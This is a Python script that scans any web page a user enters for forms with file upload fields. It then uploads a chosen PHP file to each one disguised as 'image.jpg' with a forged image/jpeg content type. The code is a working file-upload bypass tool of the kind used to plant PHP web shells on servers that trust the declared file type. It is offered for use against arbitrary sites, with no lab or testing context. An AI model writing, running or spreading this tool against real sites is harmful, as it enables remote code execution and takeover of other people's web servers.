from bs4 import BeautifulSoup
import requests
from urllib.parse import urljoin

def find_csrf_token(form):
    """
    Find and extract the CSRF token from the form.
    """
    csrf_token = form.find('input', {'name': 'csrf_token'})
    if csrf_token:
        return csrf_token.get('value')
    return None

def upload_file_as_image(session, url, file_path, file_field_name):
    """
    Upload a PHP file as an image by changing the Content-Type to image/jpeg.
    """
    try:
        # Open the PHP file in binary mode
        with open(file_path, 'rb') as file:
            # Prepare the files dictionary
            files = {file_field_name: ('image.jpg', file, 'image/jpeg')}
            
            # Send the POST request with the modified headers
            response = session.post(url, files=files)
            response.raise_for_status()  # Raise an error for bad status codes
            print(f"File uploaded successfully! Response Status Code: {response.status_code}")
            print(f"Response Content:\n{response.text[:500]}...")  # Show first 500 characters
    except Exception as e:
        print(f"Error uploading file: {e}")

def form(url, file_path):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    # Create a session to manage cookies
    session = requests.Session()

    try:
        # Send a GET request to the URL
        response = session.get(url, headers=headers)
        response.raise_for_status()  # Raise an error for bad status codes
        print("Request successful! Parsing the page...")

        # Parse the page content using BeautifulSoup
        soup = BeautifulSoup(response.text, 'lxml')
        forms = soup.find_all('form')  # Find all <form> tags

        if not forms:
            print("No forms found on the page.")
        else:
            print(f"Found {len(forms)} forms:")
            for form in forms:
                action = form.get('action')  # Get the 'action' attribute
                method = form.get('method', 'POST').upper()  # Default to POST if method is not specified
                print(f"\nForm Action: {action}, Method: {method}")

                # Find all input fields
                inputs = form.find_all(['input', 'textarea', 'select'])
                if not inputs:
                    print("  No input fields found in this form.")
                else:
                    print("  Input fields:")
                    file_field_name = None  # To store the name of the file upload field

                    for input_tag in inputs:
                        input_name = input_tag.get('name')  # Get the 'name' attribute
                        input_type = input_tag.get('type', 'text')  # Get the 'type' attribute (default to text)
                        input_value = input_tag.get('value', '')  # Get the 'value' attribute (default to empty)
                        print(f"    Name: {input_name}, Type: {input_type}, Value: {input_value}")

                        # Check if this is a file upload field
                        if input_type == 'file':
                            file_field_name = input_name
                            print(f"  File upload field found: {file_field_name}")

                    # If a file upload field is found, upload the file
                    if file_field_name:
                        submit_url = urljoin(url, action) if action else url
                        upload_file_as_image(session, submit_url, file_path, file_field_name)
                    else:
                        print("  No file upload field found in this form.")

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

def main():
    # Inputs from the user
    url = input("Enter site URL: ").strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    file_path = input("Enter the path to the PHP file: ").strip()

    # Call the form function with the URL and file path
    form(url, file_path)

if __name__ == "__main__":
    main()
